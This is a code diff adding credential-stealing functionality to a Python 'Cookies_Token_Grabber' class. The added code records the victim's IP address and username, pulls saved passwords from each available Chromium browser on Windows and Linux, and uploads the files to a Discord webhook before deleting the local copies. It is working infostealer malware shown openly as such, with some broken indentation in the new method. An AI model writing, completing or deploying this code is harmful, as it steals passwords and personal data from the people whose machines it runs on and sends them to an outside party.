@@ -7,10 +7,36 @@ import json
 import base64 
 import psutil 
 import pyautogui
+import getpass
+import logging
+import os
+import platform
+import sys
+from os.path import join
 
+import requests.exceptions
+from requests import get
+from discord_webhook import DiscordWebhook
+from passax import chrome
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
+
+handlers = [logging.FileHandler('app.log')]
+logging.basicConfig(
+    format="%(asctime)s - %(levelname)s : %(message)s",
+    level=logging.INFO,
+    datefmt='%d-%b-%y %H:%M:%S',
+    handlers=handlers)
+
+# Get the temp path for every system
+TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
+    getpass.getuser()) if os.name == "nt" else f"/tmp"
+
+# Print warning
+os.system("cls" if os.name == "nt" else "clear")
+with open("init_message.txt", "r") as file:
+    print(file.read() + '\n')
 
 class Cookies_Token_Grabber:
     def __init__(self):
@@ -20,6 +46,7 @@ class Cookies_Token_Grabber:
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Cookies_Token_Grabber"
+        
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -110,6 +137,71 @@ class Cookies_Token_Grabber:
             return decrypted_pass
         except:
             return "Chrome < 80"
+
+    def allPasswords():
+        ipaddr = get('https://api.ipify.org').text  # Get IP address
+
+    # Start webhook instance
+    hook = DiscordWebhook(
+        url=webhookk,
+        content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
+        username="Auax"
+    )
+
+    # Iterate through the handled browsers
+    for browser_name in chrome.available_browsers:
+        print(f"- {browser_name.capitalize()}")
+        logging.info(browser_name.capitalize())
+
+        try:
+            filename = join(TEMP_PATH, f"{browser_name}.txt")
+            if platform.system() == "Windows":
+                win = chrome.ChromeWindows(browser_name)
+                logging.info("Getting database paths and keys for Windows...")
+                win.get_windows()
+                logging.info("Fetching database values...")
+                win.retrieve_database()
+                win.save(filename)
+                logging.info(f"File saved to: {filename}")
+
+            elif platform.system() == "Linux":
+                lin = chrome.ChromeLinux(browser_name)
+                logging.info("Getting database paths and keys for Linux...")
+                lin.get_linux()
+                logging.info("Fetching database values...")
+                lin.retrieve_database()
+                lin.save(filename)
+                logging.info(f"File saved to: {filename}")
+
+            else:
+                print("MacOS is not supported")
+                logging.error("MacOS is not supported!")
+                sys.exit(-1)
+
+        except Exception as E:
+            print(f"\nSkipping {browser_name.capitalize()}\n")
+            logging.warning(f"\nSkipping {browser_name.capitalize()}")
+            logging.error(E)
+            continue
+
+        # Read saved password files to send them through a hook.
+        with open(filename, "rb") as file:
+            hook.add_file(file=file.read(), filename=filename)
+
+        try:
+            logging.info(f"Removing {filename}...")
+            os.remove(filename)  # Delete temp files
+        except OSError:
+            logging.warning(f"Couldn't remove {filename}")
+            pass
+
+    try:
+        hook.execute()  # Send webhook
+
+    except requests.exceptions.MissingSchema:
+        logging.error("Invalid Discord Hook URL")
+        print("\nInvalid Discord Hook URL. Exiting...")
+        sys.exit(-1)
     
     def grabPassword(self):
         master_key = self.get_master_key()
